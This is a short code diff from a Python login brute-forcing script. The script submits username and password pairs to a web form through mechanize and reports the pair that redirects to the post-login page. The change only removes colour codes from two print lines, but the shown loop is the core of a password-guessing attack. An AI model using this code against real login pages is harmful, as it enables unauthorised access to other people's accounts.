@@ -89,14 +89,14 @@ def brute_force(usernames, username, passwords, password, redirected_page, login
 			br.select_form( nr = 0 )
 			br.form['usr'] = ''.join(username)
 			br.form['pwd'] = ''.join(password)
-			print ("\033[32m[#] Checking ",br.form["usr"], " with password ", br.form["pwd"], "\033[0m")
+			print ("[#] Checking ",br.form["usr"], " with password ", br.form["pwd"])
 			print ("\033[34m----------------------------------------------------------------------------------------------\033[0m")
 	
 			response=br.submit()
 		
 			if response.geturl()==redirected_page:
 				#url to which the page is redirected after login
-				print ("\033[32m[+] Correct password is ", password," with username ", username, "\033[0m")
+				print ("[+] Correct password is ", password," with username ", username)
 				print ("\033[34m----------------------------------------------------------------------------------------------\033[0m")
 				exit()
 
